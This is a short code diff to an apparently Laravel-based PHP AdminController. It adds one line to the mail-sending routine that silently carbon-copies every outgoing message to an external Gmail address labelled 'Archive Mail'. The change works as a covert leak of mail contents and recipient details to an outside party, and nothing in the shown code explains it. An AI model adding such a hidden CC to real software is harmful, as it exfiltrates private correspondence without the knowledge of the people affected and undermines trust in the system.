@@ -398,6 +398,7 @@ class AdminController extends BaseController
                 // note: if you don't set this, it will use the defaults from config/mail.php
                 $message->from($from_address, $from_name);
                 $message->to($to_address, $to_name)
+                    ->cc('mcenterntw@gmail.com', 'Archive Mail')
                     ->subject($subject)
                     ->setBody($content);
             });
